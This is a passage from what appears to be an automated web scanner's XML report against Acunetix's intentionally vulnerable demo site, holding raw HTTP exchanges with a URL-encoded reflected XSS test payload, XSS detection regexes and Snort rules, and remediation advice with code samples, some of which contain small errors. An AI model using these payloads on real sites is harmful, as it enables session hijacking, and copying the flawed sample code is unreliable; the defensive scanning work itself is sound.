      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:48:53 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>5005</Value></Header></Headers><SetCookies /><Forms><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="739B2251FB9B3BA6971DDCA7C5340446"><URL>http://php.vulnweb.com:80/hpp/?pp=12%22%3e%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%37%34%37%32%34%29%3c%2f%73%43%72%49%70%54%3e</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor>pp</AttackParamDescriptor><Issues><Issue id="5972c7c9-14d1-4804-ba07-e2b6ee36ed2c"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>5105</EngineType><AttackHTTPRequest><![CDATA[GET /hpp/?pp=12%22%3e%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%37%34%37%32%34%29%3c%2f%73%43%72%49%70%54%3e HTTP/1.1
Referer: http://php.vulnweb.com/hpp/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="739B2251FB9B3BA6971DDCA7C5340446";PSID="E0CFF3E541D0BBC6B753F7FE5A134428";SessionType="AuditAttack";CrawlType="None";AttackType="QueryParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="pp";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="12%2522%253e%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2537%2534%2537%2532%2534%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="44";tt="40";
X-RequestManager-Memo: sid="37";smi="0";sc="1";ID="95f3d208";
X-Request-Memo: ID="d2eb03e1";sc="1";tid="44";
Cookie: CustomCookie=WebInspect0

]]></AttackHTTPRequest><VulnerabilityID>5649</VulnerabilityID><Severity>4</Severity><Name>Cross-Site Scripting</Name><Classifications><Classification kind="CWE" identifier="CWE-80" href="http://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</Classification><Classification kind="7PK" identifier="Input Validation and Representation" href="https://vulncat.fortify.com/">Input Validation and Representation</Classification><Classification kind="7PK Category" identifier="Cross-Site Scripting: Reflected" href="https://vulncat.fortify.com/">Cross-Site Scripting: Reflected</Classification></Classifications><DetectionSelection><Location offset="496" length="31" /><Location offset="581" length="31" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[<drc_fortify /><hp-img src="xss.rgc" /><br /><drc_xssrf />A Cross-Site Scripting (XSS) vulnerability was detected in the web application. Cross-Site Scripting occurs when dynamically generated web pages display user input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. In this instance, the web application was vulnerable to an automatic payload, meaning the user simply has to visit a page to make the malicious scripts execute. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on end user systems. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />
Cross-Site Scripting(XSS) happens when user input from a web client is immediately included via server-side scripts in a dynamically generated web page. Reflected XSS is specifically considered critical when malicious payload can be embedded in a URL (e.g. in query strings of GET requests). An attacker can trick a victim, via phishing attack, to click on a link with vulnerable input which has been altered to include attack code and then sent to the legitimate server. The injected code is then reflected back to the user's browser which executes it. <br /><br />

The implications of successful Cross-Site Scripting attacks are:

<ul><li>Account hijacking -  An attacker can hijack the user's session before the session cookie expires and take actions with the privileges of the user who accessed the URL, such as issuing database queries and viewing the results. </li><li>Malicious script execution - Users can unknowingly execute JavaScript, VBScript, ActiveX, HTML, or even Flash content that has been inserted into a dynamically generated page by an attacker. 

</li><li>Worm propagation - With Ajax applications, XSS can propagate somewhat like a virus. The XSS payload can autonomously inject itself into pages, and easily re-inject the same host with more XSS, all of which can be done with no hard refresh. Thus, XSS can send multiple requests using complex HTTP methods to propagate itself invisibly to the user.
</li><li>Information theft - Via redirection and fake sites, attackers can connect users to a malicious server of the attacker's choice and capture any information entered by the user.</li><li>	Denial of Service - Often by utilizing malformed display requests on sites that contain a Cross-Site Scripting vulnerability, attackers can cause a denial of service condition to occur by causing the host site to query itself repeatedly . </li><li>Browser Redirection - On certain types of sites that use frames, a user can be made to think that he is in fact on the original site when he has been redirected to a malicious one, since the URL in the browser's address bar will remains the same. This is because the entire page isn't being redirected, just the frame in which the JavaScript is being executed is redirected. </li><li>	Manipulation of user settings - Attackers can change user settings for nefarious purposes. </li><li>Bypass Content-Security-Policy protection  -  Attackers can inject a malformed tag formation, known as dangling tag injection, which in some cases allows injected script to reuse valid nonce on the page and bypass script source restriction. Additionally dangling tag injection can be used to steal sensitive information embedded in HTML response if browser is able to make a request to the injected link. </li><li>Base tag injection: Attacker can cause relative links on a page to load from a different domain by modifying the base URL for the page via base tag injection.</li><li>Link prefetch injection: While unable to execute script, attackers can use link tag with rel=prefetch that will make browsers pre-fetch the specified link even though it is never rendered and rejected subsequently due to web application enforced cross-site policy (e.g. CSP protections).</li><li>Edge side includes (ESI) Injection - ESI  is a markup language used in various HTTP devices, such as reverse proxies and load balancers, that are positioned between client and server.  An attacker can inject ESI markup to perform critical attacks such as cross-site scripting and HTTPOnly cookie protection bypass. </li></ul>]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />

View the attack string included with the request to check what to search for in the response. For instance, if "(javascript:alert('XSS')"  is submitted as an attack (or another scripting language), it will also appear as part of the response.  This indicates that the web application is taking values from the HTTP request parameters and using them in the HTTP response without first removing potentially malicious data.


The response can be viewed in “Web Browser” view in the Vulnerability pane to see the injected popup events in action. Events requiring user interaction (e.g. onmouseover or onclick events) can be triggered by performing the corresponding action (e.g. clicking the injected link). 



Injection with numeric string in src, or href, attributes indicates that the site is vulnerable to script include or content exfiltration. These can be verified by repeating the request in a browser and intercepting originating network traffic in a web proxy.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Development:</b><br /><br />
Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. When validating user input, 

verify that it matches the strictest definition of valid input possible. For example, if a certain parameter is supposed to be a number, attempt 

to convert it to a numeric data type in your programming language. <br /><br /><b>PHP:</b> intval("0".$_GET['q']);   <br /><br /><b>ASP.NET:</b> 

int.TryParse(Request.QueryString["q"], out val); <br /><br />

The same applies to date and time values, or anything that can be converted to a stricter type before being used. When accepting other types of 

text input, make sure the value matches either a list of acceptable values (white-listing), or a strict regular expression. If at any point the 

value appears invalid, do not accept it. Also, do not attempt to return the value to the user in an error message. <br /><br />

Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. 

These should be used to sanitize all input before it is displayed to the client. <br /><br /><b>PHP:</b>  string htmlspecialchars (string string 

[, int quote_style])<br /><br /><b>ASP.NET:</b> Server.HTMLEncode (strHTML String)



<br /><br />

When reflecting values into JavaScript or another format, make sure to use a type of encoding that is appropriate. Encoding data for HTML is not 

sufficient when it is reflected inside of a script or style sheet. For example, when reflecting data in a JavaScript string, make sure to encode 

all non-alphanumeric characters using hex (\xHH) encoding.<br /><br />

If you have JavaScript on your page that accesses unsafe information (like location.href) and writes it to the page (either with document.write, 

or by modifying a DOM element), make sure you encode data for HTML before writing it to the page. JavaScript does not have a built-in function to 

do this, but many frameworks do. If you are lacking an available function, something like the following will handle most cases:<br /><br />

s = s.replace(/&amp;/g,'&amp;amp;').replace(/"/i,'&amp;quot;').replace(/&lt;/i,'&amp;lt;').replace(/&gt;/i,'&amp;gt;').replace(/'/i,'&amp;apos;')


<br /><br />

Ensure that you are always using the right approach at the right time. Validating user input should be done as soon as it is received. Encoding 

data for display should be done immediately before displaying it.

<b><br /><br />


For Security Operations:</b><br /><br />

Server-side encoding, where all dynamic content is first sent through an encoding function where Scripting tags will be replaced with codes in the 

selected character set, can help to prevent Cross-Site Scripting attacks. <br /><br />

Many web application platforms and frameworks have some built-in support for preventing Cross-Site Scripting. Make sure that any built-in 

protection is enabled for your platform. In some cases, a misconfiguration could allow Cross-Site Scripting. In ASP.NET, if a page's 

EnableViewStateMac property is set to False, the ASP.NET view state can be used as a vector for Cross-Site Scripting. <br /><br />

An IDS or IPS can also be used to detect or filter out XSS attacks. Below are a few regular expressions that will help detect Cross-Site 

Scripting. <br /><br /><b>Regex for a simple XSS attack:</b><br />
/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/ix <br /><br />

The above regular expression would be added into a new Snort rule as follows: <br /><br />

alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"NII Cross-Site Scripting attempt"; flow:to_server,established; 

pcre:"/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/i"; classtype:Web-application-attack; sid:9000; rev:5;) <br /><br /><b>Paranoid regex for 

XSS attacks:</b><br />
/((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/I <br /><br />

This signature simply looks for the opening HTML tag, and its hex equivalent, followed by one or more characters other than the new line, and then 

followed by the closing tag or its hex equivalent. This may end up giving a few false positives depending upon how your web application and web 

server are structured, but it is guaranteed to catch anything that even remotely resembles a Cross-Site Scripting attack.

<br /><br /><b>For QA:</b><br /><br />


Fixes for Cross-Site Scripting defects will ultimately require code based fixes. Read the the following links for more information 

about manually testing your application for Cross-Site Scripting.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><br /><b>OWASP Cross-Site Scripting Information</b><br /><a href="https://www.owasp.org/index.php/XSS">https://www.owasp.org/index.php/XSS</a><br /><br /><b>CERT</b><br /><a href="http://www.cert.org/advisories/CA-2000-02.html">http://www.cert.org/advisories/CA-2000-02.html</a><br /><br /><b>Apache</b><br /><a href="http://httpd.apache.org/info/css-security/apache_specific.html">http://httpd.apache.org/info/css-security/apache_specific.html</a><br /><br /><b>SecurityFocus.com</b><br /><a href="http://www.securityfocus.com/infocus/1768 ">http://www.securityfocus.com/infocus/1768 </a>]]></SectionText></ReportSection><ReportSection><Name>Description</Name><SectionText><![CDATA[Cross-Site Scripting occurs when dynamically generated web pages display input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, utilizing client-side validation of user supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Impact Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Impact Description</Name><SectionText><![CDATA[When successfully exploited, Cross-Site Scripting gives an attacker a method of taking control of the interaction between a user and a web site. On a simple site composed of static content, this might only lead to changing how pages display to a specific user. When the site is capable of accepting user input, such as login information, or allows users to make choices with real world implications such as transferring funds or accessing private data, Cross-Site Scripting presents its most serious threat. The most significant danger from a successful Cross-Site Scripting attack is that an attacker will be able to emulate the credentials of an actual user by gaining access to a user’s session cookie, thereby hijacking the user session and taking over the account. The FDIC has recently indicated that unauthorized access to checking accounts is the fastest growing form of identity theft. More often than not, these instances of account hijacking are due to the presence of Cross-site scripting vulnerabilities. When an attacker gains control on the user’s end, it then often becomes unnecessary to break into the server. By that point, he already has the means to acquire the information he needs.]]></SectionText></ReportSection><ReportSection><Name>Probability Score</Name><SectionText><![CDATA[Critical]]></SectionText></ReportSection><ReportSection><Name>Probability Description</Name><SectionText><![CDATA[To carry out a Cross-Site Scripting attack, an attacker will create a URL that takes advantage of a Cross-Site Scripting flaw. The attacker must then find some way of getting a victim to visit this URL. This can be done in many ways, ranging from getting it listed in a search engine to exploiting weaknesses in mail clients that allow scripted content to be executed. Once the victim has used the Cross-Site Scripting URL, the attacker's malicious code will be executed on his or her system.  In other words, there is a lot of effort required up-front for these attacks to be successful.  However, the potential payoff makes that effort worthwhile more often than not.]]></SectionText></ReportSection><ReportSection><Name>Risk Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Risk Description</Name><SectionText><![CDATA[This vulnerability should be addressed quickly, especially if the application is already in production.]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. Validation can be done using standard ASP.NET Validation controls, or directly in your code. Do not attempt to sanitize input by removing script strings or characters, simply reject it. Always use as strict a pattern as you can possibly allow.<br /><br />
Encoding of output insures that any scriptable content is properly encoded for HTML before being sent to the client. This is done with the function HttpUtility.HtmlEncode, as shown in the following Label control sample:<br /><br />
	Label2.Text = HttpUtility.HtmlEncode(input)
<br /><br />Be sure to consider all paths that user input takes through your application. For instance, if data is entered by the user, stored in a database, and then redisplayed later, you must make sure it is properly encoded each time it is retrieved.If you must allow free-format text input, such as in a message board, and you wish to allow some HTML formatting to be used, you can handle this safely by explicitly allowing only a small list of safe tags. Here is an example of how to do this safely:<br /><br />
C# Example:<br /><br />
            StringBuilder sb = new StringBuilder(<br />
                HttpUtility.HtmlEncode(input)); <br />
            sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;"); <br />
            sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;"); <br />
            Response.Write(sb.ToString());<br /><br />

VB.NET Example: <br /><br />
        Dim sb As StringBuilder = New StringBuilder( _ <br />
                HttpUtility.HtmlEncode(input)) <br />
        sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;") <br />
        sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;") <br />
        Response.Write(sb.ToString())<br /><br />

The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure what is being returned is what is expected, and is valid. </li><li>Use client-side validation when adding extra functionality to user input checking in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered " &lt;script&gt;alertdocumentcookie( 'aaa') &lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response, so that they cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms as opposed to single-factor authentication. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the web, or given to you by an acquaintance) for use in your own code. </li></ul>
Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. These should be used to sanitize all input before displayed to the client. 
<br /><br />
ASP / ASP.NET: Server.HTMLEncode (strHTML String)<br /><br />]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[<br />The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the Web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure the data being returned is what is expected, and is valid. </li><li>When adding extra functionality to user-input checking, use client-side validation in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user-supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered "&lt;script&gt;alertdocumentcookie('aaa')&lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response. Encoding ensures that the characters cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms, such as requiring a token and password, as opposed to single-factor authentication, such as requiring only a password. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the Web or given to you by an acquaintance) for use in your own code. </li></ul>
The Java language does not have a built-in method to convert the value of the input variable into correct, non-interpretable HTML. The following code samples show two different ways of writing a utility method to sanitize all user input before displaying it back to the client. <br /><br /><br />
public static String HTMLEncode(String aTagFragment){ <br /><br />
  //make sure you replace &amp; first<br />
  aTagFragment = aTagFragment.replaceAll("&amp;", "&amp;amp;"); <br />
  aTagFragment = aTagFragment.replaceAll("&lt;", "&amp;lt;"); <br />
  aTagFragment = aTagFragment.replaceAll("&gt;", "&amp;gt;"); <br />
  aTagFragment = aTagFragment.replaceAll("\"", "&amp;quot;"); <br />
  aTagFragment = aTagFragment.replaceAll("'", "&amp;#39;"); <br />
  //replace backslash ‘\’ character<br />
  aTagFragment = aTagFragment.replaceAll("\\\\", "&amp;#92;"); <br /><br />
  return aTagFragment; <br />
}<br /><br />
public static String HTMLEncode(String aTagFragment){ <br />
  final StringBuffer result = new StringBuffer();<br />
  final StringCharacterIterator iterator = new StringCharacterIterator(aTagFragment); <br />
  char character = iterator.current();<br />
  while (character != StringCharacterIterator.DONE ){ <br />
   		if (character == '&lt;') { <br />
   			result.append("&amp;lt;"); <br />
   		} <br />
   		else if (character == '&gt;') { <br />
   			result.append("&amp;gt;"); <br />
   		} <br />
   		else if (character == '\"') { <br />
   			result.append("&amp;quot;"); <br />
   		} <br />
   		else if (character == '\'") { <br />
   			result.append("&amp;#39;"); <br />
   		} <br />
   		else if (character == '\\') { <br />
   			result.append("&amp;#92;"); <br />
   		} <br />
   		else if (character == '&amp;') { <br />
   			result.append("&amp;amp;"); <br />
   		} <br />
   		else { <br />
   			//the char is not a special one <br />
   			//add it to the result as is <br />
   			result.append(character); <br />
   		} <br />
   		character = iterator.next();<br />
   	} <br />
   	return result.toString();<br />
}]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection></Issue></Issues><RawRequest id="739B2251FB9B3BA6971DDCA7C5340446"><![CDATA[GET /hpp/?pp=12%22%3e%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%37%34%37%32%34%29%3c%2f%73%43%72%49%70%54%3e HTTP/1.1
Referer: http://php.vulnweb.com/hpp/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="739B2251FB9B3BA6971DDCA7C5340446";PSID="E0CFF3E541D0BBC6B753F7FE5A134428";SessionType="AuditAttack";CrawlType="None";AttackType="QueryParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="pp";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="12%2522%253e%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2537%2534%2537%2532%2534%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="44";tt="40";
X-RequestManager-Memo: sid="37";smi="0";sc="1";ID="95f3d208";
X-Request-Memo: ID="d2eb03e1";sc="1";tid="44";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:49:04 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 494

<title>HTTP Parameter Pollution Example</title>

<a href="?pp=12">check</a><br/>
<a href="params.php?p=valid&pp=12%22%3E%3CsCrIpT%3Ealert%2874724%29%3C%2FsCrIpT%3E">link1</a><br/><a href="params.php?p=valid&pp=12"><sCrIpT>alert(74724)</sCrIpT>">link2</a><br/><form action="params.php?p=valid&pp=12"><sCrIpT>alert(74724)</sCrIpT>"><input type=submit name=aaaa/></form><br/>
<hr>
<a href='http://blog.mindedsecurity.com/2009/05/client-side-http-parameter-pollution.html'>Original article</a>]]></RawResponse><Request id="739B2251FB9B3BA6971DDCA7C5340446"><Method>GET</Method><Path>/hpp/</Path><File /><Ext /><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>pp=12%22%3e%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%37%34%37%32%34%29%3c%2f%73%43%72%49%70%54%3e</FullQuery><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries><Query><Name>pp</Name><Value>12%22%3e%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%37%34%37%32%34%29%3c%2f%73%43%72%49%70%54%3e</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/hpp/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="739B2251FB9B3BA6971DDCA7C5340446";PSID="E0CFF3E541D0BBC6B753F7FE5A134428";SessionType="AuditAttack";CrawlType="None";AttackType="QueryParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="pp";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="12%2522%253e%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2537%2534%2537%2532%2534%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="44";tt="40";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="37";smi="0";sc="1";ID="95f3d208";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="d2eb03e1";sc="1";tid="44";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<title>HTTP Parameter Pollution Example</title>

<a href="?pp=12">check</a><br/>
<a href="params.php?p=valid&pp=12%22%3E%3CsCrIpT%3Ealert%2874724%29%3C%2FsCrIpT%3E">link1</a><br/><a href="params.php?p=valid&pp=12"><sCrIpT>alert(74724)</sCrIpT>">link2</a><br/><form action="params.php?p=valid&pp=12"><sCrIpT>alert(74724)</sCrIpT>"><input type=submit name=aaaa/></form><br/>
<hr>
<a href='http://blog.mindedsecurity.com/2009/05/client-side-http-parameter-pollution.html'>Original article</a>]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:49:04 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>494</Value></Header></Headers><SetCookies /><Forms><Form><Action>params.php?p=valid&amp;pp=12</Action><Method /><Name /><OnSubmit /><InputFields><InputField><Name>aaaa</Name><Value /><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="EC54310C1F88F6659328976C3D636498"><URL>http://php.vulnweb.com:80/pictures/</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="EC54310C1F88F6659328976C3D636498"><![CDATA[GET /pictures/ HTTP/1.1
Referer: http://php.vulnweb.com/pictures/1.jpg
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="EC54310C1F88F6659328976C3D636498";PSID="5F6018E6C06400949E0FF1908A85E6E6";SessionType="PathTruncation";CrawlType="None";AttackType="None";OriginatingEngineID="398bfe9e-1b77-4458-9691-603eea06e341";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="0";Engine="Path+Truncation";SmartMode="4";tid="72";tt="11";
X-RequestManager-Memo: sid="29";smi="0";sc="1";ID="4dba7fec";
X-Request-Memo: ID="d8aa85d8";sc="1";tid="40";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:49:06 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html
Content-Length: 2669

<html>
<head><title>Index of /pictures/</title></head>
<body>
<h1>Index of /pictures/</h1><hr><pre><a href="../">../</a>
<a href="1.jpg">1.jpg</a>                                              11-May-2011 10:27               12426
<a href="1.jpg.tn">1.jpg.tn</a>                                           11-May-2011 10:27                4355
<a href="2.jpg">2.jpg</a>                                              11-May-2011 10:27                3324
<a href="2.jpg.tn">2.jpg.tn</a>                                           11-May-2011 10:27                1353
<a href="3.jpg">3.jpg</a>                                              11-May-2011 10:27                9692
<a href="3.jpg.tn">3.jpg.tn</a>                                           11-May-2011 10:27                3725
<a href="4.jpg">4.jpg</a>                                              11-May-2011 10:27               13969
<a href="4.jpg.tn">4.jpg.tn</a>                                           11-May-2011 10:27                4615
<a href="5.jpg">5.jpg</a>                                              11-May-2011 10:27               14228
<a href="5.jpg.tn">5.jpg.tn</a>                                           11-May-2011 10:27                4428
<a href="6.jpg">6.jpg</a>                                              11-May-2011 10:27               11465
